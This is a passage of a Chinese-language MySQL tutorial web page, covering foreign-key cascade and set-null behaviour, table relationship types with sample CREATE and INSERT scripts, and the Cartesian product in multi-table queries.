class="line">A. 修改父表id为<span class="number">1</span>的记录，将id修改为<span class="number">6</span></span><br><span class="line"><span class="keyword">update</span> dept <span class="keyword">set</span> id <span class="operator">=</span> <span class="string">&#x27;6&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013173606699.png" alt="image-20221013173606699"></p><div class="tip info"><p>发现原来在子表中dept_id值为1的记录，现在也变为6了，这就是cascade级联的效果。</p></div><blockquote><div><font size="4"><b>注意：在一般的业务系统中，不会修改一张表的主键值。</b></font></div></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">B. 删除父表id为<span class="number">6</span>的记录</span><br><span class="line"> <span class="keyword">delete</span> <span class="keyword">from</span> dept <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;6&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013174028768.png" alt="image-20221013174028768"></p><div class="tip info"><p>发现父表的数据删除成功了，但是子表中关联的记录也被级联删除了。</p></div><div style="text-indent:2em;"><font size="5"><b>2). SET NULL</b></font></div><div style="text-indent:2em;"><font size="4">在进行测试之前，先需要删除上面建立的外键 fk_emp_dept_id。然后再通过数据脚本，将emp、dept表的数据恢复了。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_emp_dept_id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dept(</span><br><span class="line">id <span class="type">int</span> auto_increment comment <span class="string">&#x27;ID&#x27;</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;部门名称&#x27;</span></span><br><span class="line">)comment <span class="string">&#x27;部门表&#x27;</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dept (id, name) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;研发部&#x27;</span>), (<span class="number">2</span>, <span class="string">&#x27;市场部&#x27;</span>),(<span class="number">3</span>, <span class="string">&#x27;财务部&#x27;</span>), (<span class="number">4</span>,<span class="string">&#x27;销售部&#x27;</span>), (<span class="number">5</span>, <span class="string">&#x27;总经办&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(</span><br><span class="line">id <span class="type">int</span> auto_increment comment <span class="string">&#x27;ID&#x27;</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">age <span class="type">int</span> comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">job <span class="type">varchar</span>(<span class="number">20</span>) comment <span class="string">&#x27;职位&#x27;</span>,</span><br><span class="line">salary <span class="type">int</span> comment <span class="string">&#x27;薪资&#x27;</span>,</span><br><span class="line">entrydate <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span>,</span><br><span class="line">managerid <span class="type">int</span> comment <span class="string">&#x27;直属领导ID&#x27;</span>,</span><br><span class="line">dept_id <span class="type">int</span> comment <span class="string">&#x27;部门ID&#x27;</span></span><br><span class="line">)comment <span class="string">&#x27;员工表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, name, age, job,salary, entrydate, managerid, dept_id)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;金庸&#x27;</span>, <span class="number">66</span>, <span class="string">&#x27;总裁&#x27;</span>,<span class="number">20000</span>, <span class="string">&#x27;2000-01-01&#x27;</span>, <span class="keyword">null</span>,<span class="number">5</span>),(<span class="number">2</span>, <span class="string">&#x27;张无忌&#x27;</span>, <span class="number">20</span>,<span class="string">&#x27;项目经理&#x27;</span>,<span class="number">12500</span>, <span class="string">&#x27;2005-12-05&#x27;</span>, <span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;杨逍&#x27;</span>, <span class="number">33</span>, <span class="string">&#x27;开发&#x27;</span>, <span class="number">8400</span>,<span class="string">&#x27;2000-11-03&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>),(<span class="number">4</span>, <span class="string">&#x27;韦一笑&#x27;</span>, <span class="number">48</span>, <span class="string">&#x27;开发&#x27;</span>,<span class="number">11000</span>, <span class="string">&#x27;2002-02-05&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;常遇春&#x27;</span>, <span class="number">43</span>, <span class="string">&#x27;开发&#x27;</span>,<span class="number">10500</span>, <span class="string">&#x27;2004-09-07&#x27;</span>, <span class="number">3</span>,<span class="number">1</span>),(<span class="number">6</span>, <span class="string">&#x27;小昭&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;程序员鼓励师&#x27;</span>,<span class="number">6600</span>, <span class="string">&#x27;2004-10-12&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">add</span> <span class="keyword">constraint</span> fk_emp_dept_id <span class="keyword">foreign</span> key (dept_id) <span class="keyword">references</span></span><br><span class="line">dept(id) <span class="keyword">on</span> <span class="keyword">update</span> <span class="keyword">set</span> <span class="keyword">null</span> <span class="keyword">on</span> <span class="keyword">delete</span> <span class="keyword">set</span> <span class="keyword">null</span> ;</span><br><span class="line"></span><br><span class="line">接下来删除id为<span class="number">1</span>的数据，看看会发生什么样的现象:</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> dept <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013174842249.png" alt="image-20221013174842249"></p><div style="text-indent:2em;"><font size="4">发现父表的记录是可以正常的删除的，父表的数据删除之后，再打开子表 emp，我们发现子表emp的dept_id字段，原来dept_id为1的数据，现在都被置为NULL了。    <p>        这就是SET NULL这种删除/更新行为的效果。    </p></font></div><hr><h1 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h1><h2 id="多表关系"><a href="#多表关系" class="headerlink" title="多表关系"></a>多表关系</h2><div style="text-indent:2em;"><font size="4">项目开发中，在进行数据库表结构设计时，会根据业务需求及业务模块之间的关系，分析并设计表结构，由于业务之间相互关联，所以各个表结构之间也存在着各种联系，基本上分为三种：</font></div><div><font size="4">• 一对多(多对一)</font></div><div><font size="4">• 多对多</font></div><div><font size="4">• 一对一</font></div><h3 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h3><ul><li><div><font size="4">案例: 部门 与 员工的关系</font></div></li><li><div><font size="4">关系: 一个部门对应多个员工，一个员工对应一个部门</font></div></li><li><div><font size="4">实现: 在多的一方建立外键，指向一的一方的主键</font></div></li></ul><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019131406599.png" alt="image-20221019131406599"></p><h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><ul><li><div><font size="4">案例: 学生 与 课程的关系</font></div></li><li><div><font size="4">关系: 一个学生可以选修多门课程，一门课程也可以供多个学生选择</font></div></li><li><div><font size="4">实现: 建立第三张中间表，中间表至少包含两个外键，分别关联两方主键</font></div></li></ul><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019131519517.png" alt="image-20221019131519517"></p><div><font size="4"><b>对应的SQL脚本:</b></font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span> auto_increment <span class="keyword">primary</span> key comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line"><span class="keyword">no</span> <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;学号&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;学生表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student <span class="keyword">values</span> </span><br><span class="line">(<span class="keyword">null</span>, <span class="string">&#x27;黛绮丝&#x27;</span>, <span class="string">&#x27;2000100101&#x27;</span>),</span><br><span class="line">(<span class="keyword">null</span>, <span class="string">&#x27;谢逊&#x27;</span>,<span class="string">&#x27;2000100102&#x27;</span>),</span><br><span class="line">(<span class="keyword">null</span>, <span class="string">&#x27;殷天正&#x27;</span>, <span class="string">&#x27;2000100103&#x27;</span>),</span><br><span class="line">(<span class="keyword">null</span>, <span class="string">&#x27;韦一笑&#x27;</span>, <span class="string">&#x27;2000100104&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> course(</span><br><span class="line">id <span class="type">int</span> auto_increment <span class="keyword">primary</span> key comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;课程名称&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;课程表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course <span class="keyword">values</span> </span><br><span class="line">(<span class="keyword">null</span>, <span class="string">&#x27;Java&#x27;</span>), (<span class="keyword">null</span>, <span class="string">&#x27;PHP&#x27;</span>), </span><br><span class="line">(<span class="keyword">null</span> , <span class="string">&#x27;MySQL&#x27;</span>) ,(<span class="keyword">null</span>, <span class="string">&#x27;Hadoop&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student_course(</span><br><span class="line">id <span class="type">int</span> auto_increment comment <span class="string">&#x27;主键&#x27;</span> <span class="keyword">primary</span> key,</span><br><span class="line">studentid <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;学生ID&#x27;</span>,</span><br><span class="line">courseid <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;课程ID&#x27;</span>,</span><br><span class="line"><span class="keyword">constraint</span> fk_courseid <span class="keyword">foreign</span> key (courseid) <span class="keyword">references</span> course (id),</span><br><span class="line"><span class="keyword">constraint</span> fk_studentid <span class="keyword">foreign</span> key (studentid) <span class="keyword">references</span> student (id)</span><br><span class="line">)comment <span class="string">&#x27;学生课程中间表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student_course <span class="keyword">values</span> </span><br><span class="line">(<span class="keyword">null</span>,<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="number">1</span>,<span class="number">2</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="number">1</span>,<span class="number">3</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="number">2</span>,<span class="number">2</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="number">2</span>,<span class="number">3</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><h3 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h3><ul><li><div><font size="4">案例: 用户 与 用户详情的关系</font></div></li><li><div><font size="4">关系: 一对一关系，多用于单表拆分，将一张表的基础字段放在一张表中，其他详情字段放在另一张表中，以提升操作效率</font></div></li><li><div><font size="4">实现: 在任意一方加入外键，关联另外一方的主键，并且设置外键为唯一的(UNIQUE)</font></div></li></ul><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019131905838.png" alt="image-20221019131905838"></p><div><font size="4"><b>对应的SQL脚本:</b></font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user(</span><br><span class="line">id <span class="type">int</span> auto_increment <span class="keyword">primary</span> key comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">age <span class="type">int</span> comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">gender <span class="type">char</span>(<span class="number">1</span>) comment <span class="string">&#x27;1: 男 , 2: 女&#x27;</span>,</span><br><span class="line">phone <span class="type">char</span>(<span class="number">11</span>) comment <span class="string">&#x27;手机号&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;用户基本信息表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user_edu(</span><br><span class="line">id <span class="type">int</span> auto_increment <span class="keyword">primary</span> key comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">degree <span class="type">varchar</span>(<span class="number">20</span>) comment <span class="string">&#x27;学历&#x27;</span>,</span><br><span class="line">major <span class="type">varchar</span>(<span class="number">50</span>) comment <span class="string">&#x27;专业&#x27;</span>,</span><br><span class="line">primaryschool <span class="type">varchar</span>(<span class="number">50</span>) comment <span class="string">&#x27;小学&#x27;</span>,</span><br><span class="line">middleschool <span class="type">varchar</span>(<span class="number">50</span>) comment <span class="string">&#x27;中学&#x27;</span>,</span><br><span class="line">    university <span class="type">varchar</span>(<span class="number">50</span>) comment <span class="string">&#x27;大学&#x27;</span>,</span><br><span class="line">userid <span class="type">int</span> <span class="keyword">unique</span> comment <span class="string">&#x27;用户ID&#x27;</span>,</span><br><span class="line"><span class="keyword">constraint</span> fk_userid <span class="keyword">foreign</span> key (userid) <span class="keyword">references</span> tb_user(id)</span><br><span class="line">) comment <span class="string">&#x27;用户教育信息表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(id, name, age, gender, phone) <span class="keyword">values</span></span><br><span class="line">(<span class="keyword">null</span>,<span class="string">&#x27;黄渤&#x27;</span>,<span class="number">45</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;18800001111&#x27;</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="string">&#x27;冰冰&#x27;</span>,<span class="number">35</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;18800002222&#x27;</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="string">&#x27;码云&#x27;</span>,<span class="number">55</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;18800008888&#x27;</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="string">&#x27;李彦宏&#x27;</span>,<span class="number">50</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;18800009999&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user_edu(id, degree, major, primaryschool, middleschool,</span><br><span class="line">university, userid) <span class="keyword">values</span></span><br><span class="line">(<span class="keyword">null</span>,<span class="string">&#x27;本科&#x27;</span>,<span class="string">&#x27;舞蹈&#x27;</span>,<span class="string">&#x27;静安区第一小学&#x27;</span>,<span class="string">&#x27;静安区第一中学&#x27;</span>,<span class="string">&#x27;北京舞蹈学院&#x27;</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="string">&#x27;硕士&#x27;</span>,<span class="string">&#x27;表演&#x27;</span>,<span class="string">&#x27;朝阳区第一小学&#x27;</span>,<span class="string">&#x27;朝阳区第一中学&#x27;</span>,<span class="string">&#x27;北京电影学院&#x27;</span>,<span class="number">2</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="string">&#x27;本科&#x27;</span>,<span class="string">&#x27;英语&#x27;</span>,<span class="string">&#x27;杭州市第一小学&#x27;</span>,<span class="string">&#x27;杭州市第一中学&#x27;</span>,<span class="string">&#x27;杭州师范大学&#x27;</span>,<span class="number">3</span>),</span><br><span class="line">(<span class="keyword">null</span>,<span class="string">&#x27;本科&#x27;</span>,<span class="string">&#x27;应用数学&#x27;</span>,<span class="string">&#x27;阳泉第一小学&#x27;</span>,<span class="string">&#x27;阳泉区第一中学&#x27;</span>,<span class="string">&#x27;清华大学&#x27;</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><hr><h2 id="多表查询概述"><a href="#多表查询概述" class="headerlink" title="多表查询概述"></a>多表查询概述</h2><h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><div><font size="4">1). 删除之前 emp, dept表的测试数据</font></div><div><font size="4">2). 执行如下脚本，创建emp表与dept表并插入测试数据</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 删除表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> emp;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> dept;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建dept表，并插入数据</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dept(</span><br><span class="line">id <span class="type">int</span> auto_increment comment <span class="string">&#x27;ID&#x27;</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;部门名称&#x27;</span></span><br><span class="line">)comment <span class="string">&#x27;部门表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dept (id, name) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;研发部&#x27;</span>), (<span class="number">2</span>, <span class="string">&#x27;市场部&#x27;</span>),(<span class="number">3</span>, <span class="string">&#x27;财务部&#x27;</span>), (<span class="number">4</span>,<span class="string">&#x27;销售部&#x27;</span>), (<span class="number">5</span>, <span class="string">&#x27;总经办&#x27;</span>), (<span class="number">6</span>,<span class="string">&#x27;人事部&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建emp表，并插入数据</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(</span><br><span class="line">id <span class="type">int</span> auto_increment comment <span class="string">&#x27;ID&#x27;</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">age <span class="type">int</span> comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">job <span class="type">varchar</span>(<span class="number">20</span>) comment <span class="string">&#x27;职位&#x27;</span>,</span><br><span class="line">salary <span class="type">int</span> comment <span class="string">&#x27;薪资&#x27;</span>,</span><br><span class="line">entrydate <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span>,</span><br><span class="line">managerid <span class="type">int</span> comment <span class="string">&#x27;直属领导ID&#x27;</span>,</span><br><span class="line">dept_id <span class="type">int</span> comment <span class="string">&#x27;部门ID&#x27;</span></span><br><span class="line">)comment <span class="string">&#x27;员工表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加外键</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">add</span> <span class="keyword">constraint</span> fk_emp_dept_id <span class="keyword">foreign</span> key (dept_id) <span class="keyword">references</span> dept(id);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, name, age, job,salary, entrydate, managerid, dept_id)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;金庸&#x27;</span>, <span class="number">66</span>, <span class="string">&#x27;总裁&#x27;</span>,<span class="number">20000</span>, <span class="string">&#x27;2000-01-01&#x27;</span>, <span class="keyword">null</span>,<span class="number">5</span>),</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;张无忌&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;项目经理&#x27;</span>,<span class="number">12500</span>, <span class="string">&#x27;2005-12-05&#x27;</span>, <span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;杨逍&#x27;</span>, <span class="number">33</span>, <span class="string">&#x27;开发&#x27;</span>, <span class="number">8400</span>,<span class="string">&#x27;2000-11-03&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">4</span>, <span class="string">&#x27;韦一笑&#x27;</span>, <span class="number">48</span>, <span class="string">&#x27;开发&#x27;</span>,<span class="number">11000</span>, <span class="string">&#x27;2002-02-05&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;常遇春&#x27;</span>, <span class="number">43</span>, <span class="string">&#x27;开发&#x27;</span>,<span class="number">10500</span>, <span class="string">&#x27;2004-09-07&#x27;</span>, <span class="number">3</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">6</span>, <span class="string">&#x27;小昭&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;程序员鼓励师&#x27;</span>,<span class="number">6600</span>, <span class="string">&#x27;2004-10-12&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">7</span>, <span class="string">&#x27;灭绝&#x27;</span>, <span class="number">60</span>, <span class="string">&#x27;财务总监&#x27;</span>,<span class="number">8500</span>, <span class="string">&#x27;2002-09-12&#x27;</span>, <span class="number">1</span>,<span class="number">3</span>),</span><br><span class="line">(<span class="number">8</span>, <span class="string">&#x27;周芷若&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;会计&#x27;</span>,<span class="number">48000</span>, <span class="string">&#x27;2006-06-02&#x27;</span>, <span class="number">7</span>,<span class="number">3</span>),</span><br><span class="line">(<span class="number">9</span>, <span class="string">&#x27;丁敏君&#x27;</span>, <span class="number">23</span>, <span class="string">&#x27;出纳&#x27;</span>,<span class="number">5250</span>, <span class="string">&#x27;2009-05-13&#x27;</span>, <span class="number">7</span>,<span class="number">3</span>),</span><br><span class="line">(<span class="number">10</span>, <span class="string">&#x27;赵敏&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;市场部总监&#x27;</span>,<span class="number">12500</span>, <span class="string">&#x27;2004-10-12&#x27;</span>, <span class="number">1</span>,<span class="number">2</span>),</span><br><span class="line">(<span class="number">11</span>, <span class="string">&#x27;鹿杖客&#x27;</span>, <span class="number">56</span>, <span class="string">&#x27;职员&#x27;</span>,<span class="number">3750</span>, <span class="string">&#x27;2006-10-03&#x27;</span>, <span class="number">10</span>,<span class="number">2</span>),</span><br><span class="line">(<span class="number">12</span>, <span class="string">&#x27;鹤笔翁&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;职员&#x27;</span>,<span class="number">3750</span>, <span class="string">&#x27;2007-05-09&#x27;</span>, <span class="number">10</span>,<span class="number">2</span>),</span><br><span class="line">(<span class="number">13</span>, <span class="string">&#x27;方东白&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;职员&#x27;</span>,<span class="number">5500</span>, <span class="string">&#x27;2009-02-12&#x27;</span>, <span class="number">10</span>,<span class="number">2</span>),</span><br><span class="line">(<span class="number">14</span>, <span class="string">&#x27;张三丰&#x27;</span>, <span class="number">88</span>, <span class="string">&#x27;销售总监&#x27;</span>,<span class="number">14000</span>, <span class="string">&#x27;2004-10-12&#x27;</span>, <span class="number">1</span>,<span class="number">4</span>),</span><br><span class="line">(<span class="number">15</span>, <span class="string">&#x27;俞莲舟&#x27;</span>, <span class="number">38</span>, <span class="string">&#x27;销售&#x27;</span>,<span class="number">4600</span>, <span class="string">&#x27;2004-10-12&#x27;</span>, <span class="number">14</span>,<span class="number">4</span>),</span><br><span class="line">(<span class="number">16</span>, <span class="string">&#x27;宋远桥&#x27;</span>, <span class="number">40</span>, <span class="string">&#x27;销售&#x27;</span>,<span class="number">4600</span>, <span class="string">&#x27;2004-10-12&#x27;</span>, <span class="number">14</span>,<span class="number">4</span>),</span><br><span class="line">(<span class="number">17</span>, <span class="string">&#x27;陈友谅&#x27;</span>, <span class="number">42</span>, <span class="keyword">null</span>,<span class="number">2000</span>, <span class="string">&#x27;2011-10-12&#x27;</span>, <span class="number">1</span>,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019132958182.png" alt="image-20221019132958182"></p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><div><font size="4">多表查询就是指从多张表中查询数据。</font></div><div><font size="4">原来查询单表数据，执行的SQL形式为：select * from emp;</font></div><div><font size="4">要执行多表查询，就只需要使用逗号分隔多张表即可，如： select * from emp , dept; 具体的执行结果如下:</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019133258184.png" alt="image-20221019133258184"></p><div style="text-indent:2em;"><font size="4">查询结果中包含了大量的结果集，总共102条记录，而这其实就是员工表emp所有的记录(17) 与 部门表dept所有记录(6) 的所有组合情况，这种现象称之为笛卡尔积。</font></div><div style="text-indent:2em;"><font size="4"><b>笛卡尔积:</b> 笛卡尔乘积是指在数学中，两个集合A集合 和 B集合的所有组合情况。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019133431274.png" alt="image-20221019133431274"></p><div style="text-indent:2em;"><font size="4">而在多表查询中，我们是需要消除无效的笛卡尔积的，只保留两张表关联部分的数据。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019133521969.png" alt="image-20221019133521969"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221019133534353.png" alt="image-20221019133534353"></p><div style="text-indent:2em;"><font size="4">在SQL语句中，如何来去除无效的笛卡尔积呢？ 我们可以给多表查询加上连接查询的条件即可。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 